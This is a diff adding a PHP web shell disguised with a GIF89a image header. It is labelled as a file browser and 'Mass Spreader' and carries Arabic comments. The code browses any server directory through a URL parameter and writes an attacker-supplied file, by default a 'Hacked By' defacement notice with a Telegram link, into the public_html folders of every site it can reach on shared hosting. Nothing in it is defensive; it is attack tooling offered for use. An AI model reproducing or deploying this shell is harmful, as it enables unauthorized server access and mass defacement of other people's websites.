@@ -1,0 +1,101 @@
+GIF89a;
+<?php
+/**
+ * Combined File Browser & Advanced Mass Spreader
+ * المميزات: تصفح ملفات + نشر ملف (Mass) في مسار محدد من اختيارك
+ */
+
+// --- 1. إعدادات التصفح ---
+$path = isset($_GET['dir']) ? $_GET['dir'] : realpath('.');
+$items = @scandir($path);
+
+echo "<h2>System Explorer & Mass Spreader</h2>";
+echo "<b>Current Path:</b> $path<br>";
+echo "<hr>";
+
+// --- 2. قسم الـ Mass Spreader (التحكم الكامل) ---
+?>
+<div style="background: #f0f0f0; padding: 15px; border: 1px solid #ccc; margin-bottom: 20px;">
+    <h3>Mass Spreader Control</h3>
+    <form method="POST">
+        Target Path: <input type="text" name="target_dir" value="<?php echo $path; ?>" style="width: 400px;"><br><br>
+        File Name: <input type="text" name="file_name" value="index.txt"><br><br>
+        Content: <br>
+        <textarea name="content" style="width: 400px; height: 100px;">Hacked By Freezer && Zakiloup - https://t.me/exploit1337</textarea><br><br>
+        <input type="submit" name="run_mass" value="Execute Mass Spread">
+    </form>
+</div>
+
+<?php
+// --- 3. معالجة عملية الـ Mass ---
+if (isset($_POST['run_mass'])) {
+    $target_root = $_POST['target_dir'];
+    $filename = $_POST['file_name'];
+    $data = $_POST['content'];
+
+    function fast_spread($root, $fname, $data) {
+        if (!is_dir($root)) {
+            echo "<b style='color:red;'>Error: Path not found!</b><br>";
+            return;
+        }
+
+        $sub_folders = @scandir($root);
+        
+        // محاولة في المجلد الرئيسي أو public_html
+        $common_main = array($root, $root . "/public_html/");
+        foreach ($common_main as $m) {
+            if (is_dir($m)) {
+                if (@file_put_contents($m . DIRECTORY_SEPARATOR . $fname, $data)) {
+                    echo "[+] Main Success: " . $m . $fname . "<br>";
+                }
+            }
+        }
+
+        // البحث في المجلدات الفرعية
+        if ($sub_folders) {
+            foreach ($sub_folders as $folder) {
+                if ($folder == "." || $folder == "..") continue;
+
+                $paths_to_try = array(
+                    $root . DIRECTORY_SEPARATOR . $folder . "/public_html/",
+                    $root . DIRECTORY_SEPARATOR . "domains/" . $folder . "/public_html/",
+                    $root . DIRECTORY_SEPARATOR . $folder . "/"
+                );
+
+                foreach ($paths_to_try as $p) {
+                    if (is_dir($p)) {
+                        if (@file_put_contents($p . $fname, $data)) {
+                            echo "[+] Success: " . $p . $fname . "<br>";
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    echo "<h4>Execution Logs:</h4>";
+    fast_spread($target_root, $filename, $data);
+    echo "<hr>";
+}
+
+// --- 4. عرض الملفات والمجلدات ---
+echo "<h3>File Browser</h3>";
+echo "<ul>";
+$parent = dirname($path);
+echo "<li><a href='?dir=$parent'> [ .. ] (Back)</a></li>";
+
+if ($items) {
+    foreach ($items as $item) {
+        if ($item == "." || $item == "..") continue;
+        
+        $fullPath = $path . DIRECTORY_SEPARATOR . $item;
+        
+        if (is_dir($fullPath)) {
+            echo "<li><b>[DIR]</b> <a href='?dir=$fullPath'>$item</a></li>";
+        } else {
+            echo "<li>[FILE] $item</li>";
+        }
+    }
+}
+echo "</ul>";
+?>
